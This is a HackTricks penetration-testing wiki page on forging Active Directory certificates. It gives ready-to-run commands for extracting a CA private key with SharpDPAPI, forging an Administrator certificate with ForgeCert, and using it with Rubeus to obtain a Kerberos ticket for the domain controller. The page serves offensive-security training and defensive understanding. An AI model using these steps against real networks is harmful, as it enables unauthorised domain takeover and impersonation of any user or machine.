# Forged Certificates

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## Forged Certificates

Gaining **local admin access to a CA** allows an attacker to extract the **CA private key**, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).  The default validity period for a CA private key is 5 years, but this can obviously be set to any value during setup, sometimes as high as 10+ years.

Once on a CA, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) can extract the private keys.

<pre class="language-bash"><code class="lang-bash">.\SharpDPAPI.exe certificates /machine

# If Issuer and subject are the distinguished name of the CA, thats the one

<strong># Save the output to a .pem file and convert it to a .pfx with openssl on Kali</strong></code></pre>

Then, save the output to a `.pem` file and convert it to a **`.pfx` with openssl** on Kali.

Build the forged certificate with [**ForgeCert**](https://github.com/GhostPack/ForgeCert)**:**

```bash
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"
```

Even though you can specify any SubjectAltName, the user does need to be present in AD. In this example, the default Administrator account is used.\
Then we can simply **use Rubeus to request a legitimate TGT** with this forged certificate and use it to access the domain controller:

```bash
.\Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate:MIACAQ[...snip...]IEAAAA /password:password /nowrap
```

{% hint style="warning" %}
Note that you aren't limited to forging user certificates, we can do the same for machines. Combine this with the S4U2self trick to gain access to any machine or service in the domain.
{% endhint %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
